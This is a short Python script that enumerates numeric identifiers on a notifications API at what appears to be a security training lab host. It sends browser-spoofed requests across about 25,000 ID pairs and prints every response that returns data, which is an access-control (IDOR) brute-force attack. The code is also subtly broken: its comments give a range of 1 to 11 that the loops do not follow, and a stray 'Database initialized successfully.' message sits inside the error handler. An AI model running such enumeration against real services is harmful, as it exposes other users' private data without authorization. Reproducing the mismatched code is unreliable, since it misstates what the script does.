import requests

headers = {
    "Sec-Ch-Ua-Platform": "\"Windows\"",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept": "application/json",
    "Sec-Ch-Ua": "\"Not_A Brand\";v=\"99\", \"Chromium\";v=\"142\"",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://ipkage.exam.cyberjutsu-lab.tech/docs",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=1, i",
    "Connection": "keep-alive"
}

base_url = "https://ipkage.exam.cyberjutsu-lab.tech/api/notifications"

for x in range(1, 160):       # từ 1 đến 11
    for y in range(1, 160):   # từ 1 đến 11
        url = f"{base_url}/{x}/{y}"
        try:
            r = requests.get(url, headers=headers, timeout=5)

            if r.status_code == 200:
                print(f"[+] 200 FOUND → {url}")
                print(f"Response: {r.text}\n")

        except requests.exceptions.RequestException as e:
            pass   # bỏ qua request bị timeout hoặc lỗi
            print("Database initialized successfully.")